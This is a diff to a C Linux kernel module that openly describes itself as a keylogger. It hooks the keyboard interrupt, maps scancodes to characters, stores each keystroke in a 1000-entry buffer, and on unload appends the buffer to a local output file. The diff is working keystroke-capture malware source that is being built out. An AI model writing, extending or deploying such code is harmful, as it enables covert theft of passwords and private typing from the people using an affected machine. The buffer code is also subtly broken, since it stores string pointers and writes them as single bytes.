@@ -5,6 +5,7 @@
 #include <linux/buffer_head.h>
 #include <linux/interrupt.h>
 #include <asm/io.h>
+#include <linux/mutex.h>
 
 #ifndef __KERNEL__
 #define __KERNEL__
@@ -23,6 +24,12 @@ int shiftPressed = 0;
 const char* path = "./output.txt"; //temporary
 struct file *outfile;
 
+// character buffer constants
+#define B_SIZE 1000
+char* char_buffer[B_SIZE];
+int pos = 0;
+int rollover = 0;
+
 // FUNCTION PROTOTYPES
 struct file *createFile(const char *path);
 int writeToFile(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
@@ -30,6 +37,7 @@ void closeFile(struct file *file);
 static irqreturn_t get_scancode(int irq, void *dev_id);
 void scancode_to_key(char scancode);
 void check_shift(unsigned char scancode);
+void write_buffer_to_output(int n);
 
 //Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
 
@@ -60,7 +68,7 @@ struct file *createFile(const char *path)
 
     oldFileSpace = get_fs();
     set_fs(get_ds());
-    fileP = filp_open(path, O_CREAT | O_RDWR, OUTPUT_MODE);
+    fileP = filp_open(path, O_CREAT | O_APPEND | O_WRONLY, OUTPUT_MODE);
     set_fs(oldFileSpace);
     if (IS_ERR(fileP)) {
         err = PTR_ERR(fileP);
@@ -104,6 +112,14 @@ void scancode_to_key(char scancode)
 	if (scancodes[scancode][0] != '\0')
 	{
 		printk("%s\n", scancodes[scancode][shiftPressed]);
+		char_buffer[pos] = scancodes[scancode][shiftPressed];
+		//printk("%s\n", char_buffer[pos]);
+		pos++;
+		if (pos >= B_SIZE) 
+		{
+			pos = 0;
+			rollover++;
+		}
 	}
 }
 
@@ -119,6 +135,24 @@ void check_shift(unsigned char scancode)
 		shiftPressed = 0;
 	}
 }
+
+// writes all the characters stored in the buffer to the output file
+void write_buffer_to_output(int n)
+{
+	int i = 0;
+	int max_size = B_SIZE;
+
+	if (rollover == 0)
+	{
+		max_size = pos;
+	}
+
+	while (i < max_size)
+	{
+		writeToFile(outfile, 0, char_buffer[i], 1);
+		i++;
+	}
+}
   
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("A kernel-based keylogger module");
@@ -127,7 +161,6 @@ int __init init_keylogger(void)
 {
 	printk(KERN_INFO "Hello! Keylogger module successfully loaded.\n");
 	outfile = createFile(path);
-	writeToFile(outfile, 0, "test", 4); // TEMPORARY
 	request_irq(1, get_scancode, IRQF_SHARED, "kbd2", (void *)get_scancode);
 	return 0;
 }
@@ -136,6 +169,7 @@ void __exit exit_module(void)
 {
 	printk(KERN_INFO "Exiting keylogger kernel module.\n");
 	free_irq(1, (void *)get_scancode);
+	write_buffer_to_output(0);
 	closeFile(outfile);
 	return;
 }
